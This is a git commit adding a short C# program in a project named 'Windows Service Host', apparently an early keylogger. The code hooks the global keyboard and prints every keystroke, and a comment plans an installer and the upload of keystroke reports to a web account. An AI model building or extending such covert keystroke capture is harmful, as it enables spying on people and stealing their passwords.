f652230b96dae351008a1175c2e37a2e7d2e2de3
Nayil <n.arana1@outlook.com>
2018-11-03 22:09:20 -0400

    Add project files.

---
+++ Windows Service Host/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Keystroke.API;
+
+/* Features to add
+ * 1. Being able to tell which app is in focus
+ * 2. Separating Reports by Date
+ * 3. Creating the web app (login page, registration page, PC page, organize reports by date, database)
+ * 4. Creating an installer
+ * 5. Sending the .txt files to the correct user account and PC
+ */
+
+namespace Windows_Service_Host
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            using (var api = new KeystrokeAPI())
+            {
+                api.CreateKeyboardHook((character) => { Console.Write(character); });
+                Application.Run();
+            }
+        }
+    }
+}
